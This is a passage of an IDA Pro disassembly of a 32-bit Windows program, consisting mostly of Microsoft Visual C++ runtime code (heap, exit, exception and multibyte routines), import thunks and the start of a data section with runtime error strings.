		mov	dword_40E5D0, eax
		retn
; [0000001E BYTES: COLLAPSED FUNCTION _rand. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS KEYPAD "+"	TO EXPAND]
; [00000335 BYTES: COLLAPSED FUNCTION _memcpy. PRESS KEYPAD "+"	TO EXPAND]
; [0000000E BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD "+" TO EXPAND]
; [0000000B BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS KEYPAD "+"	TO EXPAND]
; [000000D7 BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, [ebp-14h]
		mov	ecx, [eax]
		mov	ecx, [ecx]
		mov	[ebp-68h], ecx
		push	eax
		push	ecx
		call	__XcptFilter
		pop	ecx
		pop	ecx
		retn
; ---------------------------------------------------------------------------
		mov	esp, [ebp-18h]
		push	dword ptr [ebp-68h]
		call	__exit
; [00000022 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS KEYPAD	"+" TO EXPAND]
; ---------------------------------------------------------------------------
		pop	ecx
		pop	ecx
		retn
; [00000023 BYTES: COLLAPSED FUNCTION _fast_error_exit.	PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		retn
; [0000003C BYTES: COLLAPSED FUNCTION __heap_init. PRESS KEYPAD	"+" TO EXPAND]
; ---------------------------------------------------------------------------

__heap_term:
		push	ebx
		xor	ebx, ebx
		cmp	dword_40F4DC, ebx
		push	ebp
		mov	ebp, ds:HeapFree
		jle	short loc_404F8F
		mov	eax, lpMem
		push	esi
		push	edi
		mov	edi, ds:VirtualFree
		lea	esi, [eax+0Ch]

loc_404F5B:				; CODE XREF: .text:00404F8Bj
		push	4000h
		push	100000h
		push	dword ptr [esi]
		call	edi ; VirtualFree
		push	8000h
		push	0
		push	dword ptr [esi]
		call	edi ; VirtualFree
		push	dword ptr [esi+4]
		push	0
		push	hHeap
		call	ebp ; HeapFree
		add	esi, 14h
		inc	ebx
		cmp	ebx, dword_40F4DC
		jl	short loc_404F5B
		pop	edi
		pop	esi

loc_404F8F:				; CODE XREF: .text:00404F49j
		push	lpMem
		push	0
		push	hHeap
		call	ebp ; HeapFree
		push	hHeap
		call	ds:HeapDestroy
		pop	ebp
		pop	ebx
		retn
; ---------------------------------------------------------------------------
		mov	eax, dword_40E5EC
		retn
; [00000017 BYTES: COLLAPSED FUNCTION __set_sbh_threshold. PRESS KEYPAD	"+" TO EXPAND]
; [0000003E BYTES: COLLAPSED FUNCTION ___sbh_heap_init.	PRESS KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS KEYPAD "+" TO EXPAND]
; [0000032B BYTES: COLLAPSED FUNCTION ___sbh_free_block. PRESS KEYPAD "+" TO EXPAND]
; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS	KEYPAD "+" TO EXPAND]
; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD "+"	TO EXPAND]
; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD "+" TO EXPAND]
; [000002F6 BYTES: COLLAPSED FUNCTION ___sbh_resize_block. PRESS KEYPAD	"+" TO EXPAND]
; ---------------------------------------------------------------------------

___sbh_heapmin:
		mov	eax, Dst
		test	eax, eax
		jz	locret_405BDA
		mov	ecx, dword_40F4D0
		push	4000h
		shl	ecx, 0Fh
		add	ecx, [eax+0Ch]
		push	8000h
		push	ecx
		call	ds:VirtualFree
		mov	ecx, dword_40F4D0
		mov	eax, Dst
		mov	edx, 80000000h
		shr	edx, cl
		or	[eax+8], edx
		mov	eax, Dst
		mov	ecx, dword_40F4D0
		mov	eax, [eax+10h]
		and	dword ptr [eax+ecx*4+0C4h], 0
		mov	eax, Dst
		mov	eax, [eax+10h]
		dec	byte ptr [eax+43h]
		mov	eax, Dst
		mov	ecx, [eax+10h]
		cmp	byte ptr [ecx+43h], 0
		jnz	short loc_405B81
		and	dword ptr [eax+4], 0FFFFFFFEh
		mov	eax, Dst

loc_405B81:				; CODE XREF: .text:00405B76j
		cmp	dword ptr [eax+8], 0FFFFFFFFh
		jnz	short loc_405BD3
		cmp	dword_40F4DC, 1
		jle	short loc_405BD3
		push	dword ptr [eax+10h]
		push	0
		push	hHeap
		call	ds:HeapFree
		mov	eax, dword_40F4DC
		mov	edx, lpMem
		lea	eax, [eax+eax*4]
		shl	eax, 2
		mov	ecx, eax
		mov	eax, Dst
		sub	ecx, eax
		lea	ecx, [ecx+edx-14h]
		push	ecx
		lea	ecx, [eax+14h]
		push	ecx
		push	eax
		call	_memcpy_0
		add	esp, 0Ch
		dec	dword_40F4DC

loc_405BD3:				; CODE XREF: .text:00405B85j
					; .text:00405B8Ej
		and	Dst, 0

locret_405BDA:				; CODE XREF: .text:00405B11j
		retn
; [0000032F BYTES: COLLAPSED FUNCTION ___sbh_heap_check. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		mov	ecx, [esp+4]
		mov	eax, dword_40EEF0
		mov	dword_40EEF0, ecx
		retn
; ---------------------------------------------------------------------------
		mov	eax, dword_40EEF0
		retn
; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS	KEYPAD "+" TO EXPAND]
; [0000009B BYTES: COLLAPSED FUNCTION ___InternalCxxFrameHandler. PRESS	KEYPAD "+" TO EXPAND]
; [000001A7 BYTES: COLLAPSED FUNCTION FindHandler(EHExceptionRecord *,EHRegistrationNode *,_CONTEXT *,void *,_s_FuncInfo const *,uchar,int,EHRegistrationNode *). PRESS	KEYPAD "+" TO EXPAND]
; [000000A8 BYTES: COLLAPSED FUNCTION FindHandlerForForeignException(EHExceptionRecord *,EHRegistrationNode *,_CONTEXT *,void *,_s_FuncInfo const *,int,int,EHRegistrationNode *). PRESS KEYPAD	"+" TO EXPAND]
; [0000005D BYTES: COLLAPSED FUNCTION TypeMatch(_s_HandlerType const *,_s_CatchableType	const *,_s_ThrowInfo const *). PRESS KEYPAD "+"	TO EXPAND]
; [0000009E BYTES: COLLAPSED FUNCTION ___FrameUnwindToState. PRESS KEYPAD "+" TO EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION unknown_libname_3. PRESS KEYPAD "+" TO EXPAND]
; [0000007B BYTES: COLLAPSED FUNCTION CatchIt(EHExceptionRecord	*,EHRegistrationNode *,_CONTEXT	*,void *,_s_FuncInfo const *,_s_HandlerType const *,_s_CatchableType const *,_s_TryBlockMapEntry const *,int,EHRegistrationNode	*,uchar). PRESS	KEYPAD "+" TO EXPAND]
; [0000009C BYTES: COLLAPSED FUNCTION CallCatchBlock(EHExceptionRecord *,EHRegistrationNode *,_CONTEXT *,_s_FuncInfo const *,void *,int,ulong).	PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_40644D	proc near		; DATA XREF: .rdata:0040C168o
		push	dword ptr [ebp-14h] ; struct _EXCEPTION_POINTERS *
		call	?ExFilterRethrow@@YAHPAU_EXCEPTION_POINTERS@@@Z	; ExFilterRethrow(_EXCEPTION_POINTERS *)
		pop	ecx
		retn
sub_40644D	endp


; =============== S U B	R O U T	I N E =======================================


sub_406457	proc near		; DATA XREF: .rdata:0040C16Co
		mov	esp, [ebp-18h]
		and	dword ptr [ebp-2Ch], 0
		push	0FFFFFFFFh
		lea	eax, [ebp-10h]
		push	eax
		call	__local_unwind2
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_40643E
sub_406457	endp


; =============== S U B	R O U T	I N E =======================================


sub_40646F	proc near		; DATA XREF: .rdata:0040C160o
		xor	ebx, ebx
		mov	esi, [ebp+0Ch]
		mov	edi, [ebp+8]
sub_40646F	endp ; sp-analysis failed

; [00000046 BYTES: COLLAPSED FUNCTION sub_406477. PRESS	KEYPAD "+" TO EXPAND]
; [0000002A BYTES: COLLAPSED FUNCTION ExFilterRethrow(_EXCEPTION_POINTERS *). PRESS KEYPAD "+" TO EXPAND]
; [000001B8 BYTES: COLLAPSED FUNCTION BuildCatchObject(EHExceptionRecord *,EHRegistrationNode *,_s_HandlerType const *,_s_CatchableType	const *). PRESS	KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		push	1
		pop	eax
		retn
; ---------------------------------------------------------------------------
		mov	esp, [ebp-18h]
		jmp	sub_40678C
; [00000056 BYTES: COLLAPSED FUNCTION unknown_libname_4. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		xor	eax, eax
		cmp	[ebp+0Ch], al
		setnz	al
		retn
; ---------------------------------------------------------------------------
		mov	esp, [ebp-18h]
		jmp	sub_40678C
; [00000023 BYTES: COLLAPSED FUNCTION AdjustPointer(void *,PMD const &). PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [0000004C BYTES: COLLAPSED FUNCTION unknown_libname_5. PRESS KEYPAD "+" TO EXPAND]
; [00000056 BYTES: COLLAPSED FUNCTION sub_40678C. PRESS	KEYPAD "+" TO EXPAND]
; [00000010 BYTES: COLLAPSED FUNCTION unexpected(void).	PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_4067F2	proc near		; CODE XREF: _GetRangeOfTrysToCheck(_s_FuncInfo	const *,int,int,uint *,uint *)+23p
					; _GetRangeOfTrysToCheck(_s_FuncInfo const *,int,int,uint *,uint *):loc_40484Dp ...

var_18		= dword	ptr -18h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	0FFFFFFFFh
		push	offset dword_40C1A8
		push	offset unknown_libname_8 ; Microsoft VisualC 2-10/net runtime
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_18], esp
		and	[ebp+var_4], 0
		mov	eax, off_40E604
		test	eax, eax
		jz	short loc_40683A
		mov	[ebp+var_4], 1
		call	eax ; sub_40678C
; ---------------------------------------------------------------------------
		jmp	short loc_406836
; ---------------------------------------------------------------------------

loc_40682F:				; DATA XREF: .rdata:0040C1B8o
		push	1
		pop	eax
		retn
; ---------------------------------------------------------------------------

loc_406833:				; DATA XREF: .rdata:0040C1BCo
		mov	esp, [ebp+var_18]

loc_406836:				; CODE XREF: sub_4067F2+3Bj
		and	[ebp+var_4], 0

loc_40683A:				; CODE XREF: sub_4067F2+30j
		or	[ebp+var_4], 0FFFFFFFFh
		call	$+5

loc_406843:				; DATA XREF: .rdata:0040C1B0o
		jmp	sub_40678C
sub_4067F2	endp

; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD "+"	TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD "+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------

__cexit:
		push	1
		push	0
		push	0
		call	_doexit
		add	esp, 0Ch
		retn
; ---------------------------------------------------------------------------

__c_exit:
		push	1
		push	1
		push	0
		call	_doexit
		add	esp, 0Ch
		retn
; [00000099 BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD "+"	TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS	KEYPAD "+" TO EXPAND]
; [00000141 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD "+" TO	EXPAND]
; [00000043 BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS KEYPAD	"+" TO EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION __wincmdln. PRESS	KEYPAD "+" TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION __setargv. PRESS KEYPAD "+" TO EXPAND]
; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD "+" TO EXPAND]
; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD "+" TO	EXPAND]
; [000001AB BYTES: COLLAPSED FUNCTION __ioinit.	PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------

__ioterm:
		push	esi
		mov	esi, offset dword_40F360

loc_40712D:				; CODE XREF: .text:00407146j
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_40713D
		push	eax
		call	_free
		and	dword ptr [esi], 0
		pop	ecx

loc_40713D:				; CODE XREF: .text:00407131j
		add	esi, 4
		cmp	esi, offset dword_40F460
		jl	short loc_40712D
		pop	esi
		retn
; ---------------------------------------------------------------------------
		align 4
		push	esi
		inc	ebx
		xor	dh, [eax]
		pop	eax
		inc	ebx
		xor	[eax], dh
; [000000BD BYTES: COLLAPSED FUNCTION unknown_libname_8. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------

unknown_libname_9:			; Microsoft VisualC 2-10/net runtime
		push	ebp
		mov	ecx, [esp+8]
		mov	ebp, [ecx]
		mov	eax, [ecx+1Ch]
		push	eax
		mov	eax, [ecx+18h]
		push	eax
		call	__local_unwind2
		add	esp, 8
		pop	ebp
		retn	4
; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD "+" TO EXPAND]
; [00000153 BYTES: COLLAPSED FUNCTION __NMSG_WRITE. PRESS KEYPAD "+" TO	EXPAND]
; ---------------------------------------------------------------------------

__GET_RTERRMSG:
		mov	ecx, [esp+4]
		xor	edx, edx
		mov	eax, offset dword_40E698

loc_4073C3:				; CODE XREF: .text:004073D0j
		cmp	ecx, [eax]
		jz	short loc_4073D2
		add	eax, 8
		inc	edx
		cmp	eax, offset dword_40E728
		jl	short loc_4073C3

loc_4073D2:				; CODE XREF: .text:004073C5j
		mov	eax, edx
		shl	eax, 3
		cmp	ecx, dword_40E698[eax]
		jnz	short loc_4073E6
		mov	eax, off_40E69C[eax]
		retn
; ---------------------------------------------------------------------------

loc_4073E6:				; CODE XREF: .text:004073DDj
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------
		align 10h
; [00000335 BYTES: COLLAPSED FUNCTION _memcpy_0. PRESS KEYPAD "+" TO EXPAND]
; [00000046 BYTES: COLLAPSED FUNCTION __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS	*). PRESS KEYPAD "+" TO	EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_40776B	proc near		; DATA XREF: .data:0040D514o
		push	offset ?__CxxUnhandledExceptionFilter@@YGJPAU_EXCEPTION_POINTERS@@@Z ; lpTopLevelExceptionFilter
		call	ds:SetUnhandledExceptionFilter
		mov	lpTopLevelExceptionFilter, eax
		retn
sub_40776B	endp


; =============== S U B	R O U T	I N E =======================================


sub_40777C	proc near		; DATA XREF: .data:0040DA28o
		push	lpTopLevelExceptionFilter ; lpTopLevelExceptionFilter
		call	ds:SetUnhandledExceptionFilter
		retn
sub_40777C	endp

; [0000001C BYTES: COLLAPSED FUNCTION _ValidateRead(void const *,uint).	PRESS KEYPAD "+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION _ValidateWrite(void *,uint). PRESS KEYPAD	"+" TO EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION _ValidateExecute(int (*)(void)). PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000084 BYTES: COLLAPSED FUNCTION _strcmp. PRESS KEYPAD "+"	TO EXPAND]
; ---------------------------------------------------------------------------
; [00000028 BYTES: COLLAPSED CHUNK OF FUNCTION sub_40678C. PRESS KEYPAD	"+" TO EXPAND]
; ---------------------------------------------------------------------------

__ismbbkprint:
		push	3
		push	0
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; ---------------------------------------------------------------------------

__ismbbkpunct:
		push	2
		push	0
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; ---------------------------------------------------------------------------

__ismbbalnum:
		push	1
		push	107h
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; ---------------------------------------------------------------------------

__ismbbalpha:
		push	1
		push	103h
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; ---------------------------------------------------------------------------

__ismbbgraph:
		push	3
		push	117h
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; ---------------------------------------------------------------------------

__ismbbprint:
		push	3
		push	157h
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; ---------------------------------------------------------------------------

__ismbbpunct:
		push	2
		push	10h
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; [00000011 BYTES: COLLAPSED FUNCTION __ismbblead. PRESS KEYPAD	"+" TO EXPAND]
; ---------------------------------------------------------------------------

__ismbbtrail:
		push	8
		push	0
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; ---------------------------------------------------------------------------

__ismbbkana:
		cmp	CodePage, 3A4h
		jnz	short loc_407955
		push	3
		push	0
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_407955
		push	1
		pop	eax
		retn
; ---------------------------------------------------------------------------

loc_407955:				; CODE XREF: .text:0040793Bj
					; .text:0040794Fj
		xor	eax, eax
		retn
; [00000031 BYTES: COLLAPSED FUNCTION _x_ismbbtype. PRESS KEYPAD "+" TO	EXPAND]
; [00000199 BYTES: COLLAPSED FUNCTION __setmbcp. PRESS KEYPAD "+" TO EXPAND]
; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS KEYPAD "+" TO	EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD "+" TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS.	PRESS KEYPAD "+" TO EXPAND]
; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS KEYPAD	"+" TO EXPAND]
; ---------------------------------------------------------------------------

__getmbcp:
		mov	eax, dword_40F13C
		neg	eax
		sbb	eax, eax
		and	eax, CodePage
		retn
; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD "+"	TO EXPAND]
; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [000000FE BYTES: COLLAPSED FUNCTION _strncpy.	PRESS KEYPAD "+" TO EXPAND]
; [00000144 BYTES: COLLAPSED FUNCTION _signal. PRESS KEYPAD "+"	TO EXPAND]
; [0000012D BYTES: COLLAPSED FUNCTION _raise. PRESS KEYPAD "+" TO EXPAND]
; [00000045 BYTES: COLLAPSED FUNCTION _siglookup. PRESS	KEYPAD "+" TO EXPAND]
; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS	KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strncnt.	PRESS KEYPAD "+" TO EXPAND]
; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD "+" TO	EXPAND]
		align 10h
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD "+" TO EXPAND]
		align 10h
		jmp	ds:HeapFree
; ---------------------------------------------------------------------------
		jmp	ds:HeapReAlloc
; ---------------------------------------------------------------------------
		jmp	ds:HeapAlloc
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		jmp	ds:GetModuleHandleA
; ---------------------------------------------------------------------------
		jmp	ds:GetStartupInfoA
; ---------------------------------------------------------------------------
		jmp	ds:GetCommandLineA
; ---------------------------------------------------------------------------
		jmp	ds:GetVersion
; ---------------------------------------------------------------------------
		jmp	ds:ExitProcess
; ---------------------------------------------------------------------------
		jmp	ds:HeapDestroy
; ---------------------------------------------------------------------------
		jmp	ds:HeapCreate
; ---------------------------------------------------------------------------
		jmp	ds:VirtualFree
; ---------------------------------------------------------------------------
		jmp	ds:VirtualAlloc
; ---------------------------------------------------------------------------
		jmp	ds:IsBadWritePtr
; ---------------------------------------------------------------------------
		jmp	ds:TerminateProcess
; ---------------------------------------------------------------------------
		jmp	ds:GetCurrentProcess
; ---------------------------------------------------------------------------
		jmp	ds:UnhandledExceptionFilter
; ---------------------------------------------------------------------------
		jmp	ds:FreeEnvironmentStringsA
; ---------------------------------------------------------------------------
		jmp	ds:FreeEnvironmentStringsW
; ---------------------------------------------------------------------------
		jmp	ds:WideCharToMultiByte
; ---------------------------------------------------------------------------
		jmp	ds:GetEnvironmentStrings
; ---------------------------------------------------------------------------
		jmp	ds:GetEnvironmentStringsW
; ---------------------------------------------------------------------------
		jmp	ds:SetHandleCount
; ---------------------------------------------------------------------------
		jmp	ds:GetStdHandle
; ---------------------------------------------------------------------------
		jmp	ds:GetFileType
; ---------------------------------------------------------------------------
		jmp	ds:SetUnhandledExceptionFilter
; ---------------------------------------------------------------------------
		jmp	ds:IsBadReadPtr
; ---------------------------------------------------------------------------
		jmp	ds:IsBadCodePtr
; ---------------------------------------------------------------------------
		jmp	ds:GetCPInfo
; ---------------------------------------------------------------------------
		jmp	ds:GetACP
; ---------------------------------------------------------------------------
		jmp	ds:GetOEMCP
; ---------------------------------------------------------------------------
		jmp	ds:GetLastError
; ---------------------------------------------------------------------------
		jmp	ds:SetConsoleCtrlHandler
; ---------------------------------------------------------------------------
		jmp	ds:MultiByteToWideChar
; ---------------------------------------------------------------------------
		jmp	ds:LCMapStringA
; ---------------------------------------------------------------------------
		jmp	ds:LCMapStringW
; ---------------------------------------------------------------------------
		jmp	ds:GetStringTypeA
; ---------------------------------------------------------------------------
		jmp	ds:GetStringTypeW
; ---------------------------------------------------------------------------
		db 20DCh dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_40A750	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-2ECh]
		call	sub_401046
		retn
sub_40A750	endp


; =============== S U B	R O U T	I N E =======================================


sub_40A75C	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-2F4h]
		call	sub_401028
		retn
sub_40A75C	endp


; =============== S U B	R O U T	I N E =======================================


sub_40A768	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-308h]
		call	sub_401073
		retn
sub_40A768	endp


; =============== S U B	R O U T	I N E =======================================


sub_40A774	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-354h]
		call	sub_401082
		retn
sub_40A774	endp


; =============== S U B	R O U T	I N E =======================================


sub_40A780	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-2F8h]
		call	sub_401005
		retn
sub_40A780	endp


; =============== S U B	R O U T	I N E =======================================


sub_40A78C	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-304h]
		call	sub_401073
		retn
sub_40A78C	endp


; =============== S U B	R O U T	I N E =======================================


sub_40A798	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-2F0h]
		call	sub_401073
		retn
sub_40A798	endp


; =============== S U B	R O U T	I N E =======================================


sub_40A7A4	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-2FCh]
		call	sub_401073
		retn
sub_40A7A4	endp


; =============== S U B	R O U T	I N E =======================================


sub_40A7B0	proc near		; DATA XREF: .rdata:stru_40C6E8o
		lea	ecx, [ebp-350h]
		call	sub_401037
		retn
sub_40A7B0	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_10. PRESS	KEYPAD "+" TO EXPAND]
		align 2000h
_text		ends

; Section 2. (virtual address 0000C000)
; Virtual size			: 00000864 (   2148.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 0000C000
; Flags	40000040: Data Readable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 40C000h
; char Str[]
Str		db 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww'
					; DATA XREF: __initp_eh_hooks+3o
					; sub_401251+35r
		db 'wwwwwww',0
		align 4
		dd 3Bh dup(0)
dword_40C138	dd 0FFFFFFFFh, 404E95h,	404EA9h, 0 ; DATA XREF:	start+5o
dword_40C148	dd 0FFFFFFFFh, 4062E9h,	4062F3h, 0 ; DATA XREF:	___FrameUnwindToState+5o
dword_40C158	dd 0FFFFFFFFh, 0	; DATA XREF: CallCatchBlock(EHExceptionRecord *,EHRegistrationNode *,_CONTEXT *,_s_FuncInfo const *,void *,int,ulong)+5o
		dd offset sub_40646F
		align 8
		dd offset sub_40644D
		dd offset sub_406457
dword_40C170	dd 0FFFFFFFFh, 40669Fh,	4066A3h, 0
					; DATA XREF: BuildCatchObject(EHExceptionRecord	*,EHRegistrationNode *,_s_HandlerType const *,_s_CatchableType const *)+5o
dword_40C180	dd 0FFFFFFFFh, 406701h,	40670Ah, 0 ; DATA XREF:	unknown_libname_4+5o
dword_40C190	dd 0FFFFFFFFh, 0	; DATA XREF: sub_40678C+5o
		dd offset loc_4067DD
		align 10h
		dd offset loc_4067C9
		dd offset loc_4067CD
dword_40C1A8	dd 0FFFFFFFFh, 0	; DATA XREF: sub_4067F2+5o
		dd offset loc_406843
		align 8
		dd offset loc_40682F
		dd offset loc_406833
aRuntimeError	db 'runtime error ',0
		align 10h
		db 0Dh,0Ah,0
		align 4
aTlossError	db 'TLOSS error',0Dh,0Ah,0
		align 4
aSingError	db 'SING error',0Dh,0Ah,0
		align 4
aDomainError	db 'DOMAIN error',0Dh,0Ah,0
		align 4
aR6028UnableToI	db 'R6028',0Dh,0Ah
		db '- unable to initialize heap',0Dh,0Ah,0
		align 4
aR6027NotEnough	db 'R6027',0Dh,0Ah
		db '- not enough space for lowio initialization',0Dh,0Ah,0
		align 4
aR6026NotEnough	db 'R6026',0Dh,0Ah
		db '- not enough space for stdio initialization',0Dh,0Ah,0
		align 4
aR6025PureVirtu	db 'R6025',0Dh,0Ah
		db '- pure virtual function call',0Dh,0Ah,0
		align 4
aR6024NotEnough	db 'R6024',0Dh,0Ah
		db '- not enough space for _onexit/atexit table',0Dh,0Ah,0
		align 4
aR6019UnableToO	db 'R6019',0Dh,0Ah
		db '- unable to open console device',0Dh,0Ah,0
		align 4
aR6018Unexpecte	db 'R6018',0Dh,0Ah
		db '- unexpected heap error',0Dh,0Ah,0
		align 4
aR6017Unexpecte	db 'R6017',0Dh,0Ah
		db '- unexpected multithread lock error',0Dh,0Ah,0
		align 4
aR6016NotEnough	db 'R6016',0Dh,0Ah
		db '- not enough space for thread data',0Dh,0Ah,0
aAbnormalProgra	db 0Dh,0Ah
		db 'abnormal program termination',0Dh,0Ah,0
		align 4
aR6009NotEnough	db 'R6009',0Dh,0Ah
		db '- not enough space for environment',0Dh,0Ah,0
aR6008NotEnough	db 'R6008',0Dh,0Ah
		db '- not enough space for arguments',0Dh,0Ah,0
		align 4
aR6002FloatingP	db 'R6002',0Dh,0Ah      ; DATA XREF: .data:off_40E69Co
		db '- floating point not loaded',0Dh,0Ah,0
		align 4
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: __NMSG_WRITE+119o
		align 4
; char asc_40C474[]
asc_40C474	db 0Ah			; DATA XREF: __NMSG_WRITE+F1o
		db 0Ah,0
		align 4
; char aRuntimeErrorPr[]
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: __NMSG_WRITE+D3o
		db 0Ah
		db 'Program: ',0
		align 4
; char a___[]
a___		db '...',0              ; DATA XREF: __NMSG_WRITE+BFo
; char Source[]
Source		db '<program name unknown>',0 ; DATA XREF: __NMSG_WRITE+7Do
		align 10h
; char aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+3Do
		align 4
; char aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+35o
; char ProcName[]
ProcName	db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+24o
; char LibFileName[]
LibFileName	db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+Do
		align 4
; char byte_40C4EC[]
byte_40C4EC	db 4 dup(0)		; DATA XREF: ___crtLCMapStringA+57o
					; ___crtGetStringTypeA+52o
; const	WCHAR SrcStr
SrcStr		dw 0			; DATA XREF: ___crtLCMapStringA+36o
					; ___crtGetStringTypeA+39o
		align 8
dword_40C4F8	dd 0FFFFFFFFh, 4082D4h,	4082D8h, 0FFFFFFFFh, 408388h, 40838Ch
					; DATA XREF: ___crtLCMapStringA+5o
dword_40C510	dd 0FFFFFFFFh, 40850Ch,	408510h, 73h dup(0)
					; DATA XREF: ___crtGetStringTypeA+5o
stru_40C6E8	dd 19930520h		; Magic	; DATA XREF: unknown_libname_10o
		dd 9			; Count
		dd offset stru_40C6E8.Info; InfoPtr
		dd 0			; CountDtr
		dd 0			; DtrPtr
		dd 3 dup(0)		; _unk
		dd -1			; Info.Id
		dd offset sub_40A750	; Info.Proc
		dd 0			; Info.Id
		dd offset sub_40A75C	; Info.Proc
		dd 1			; Info.Id
		dd offset sub_40A768	; Info.Proc
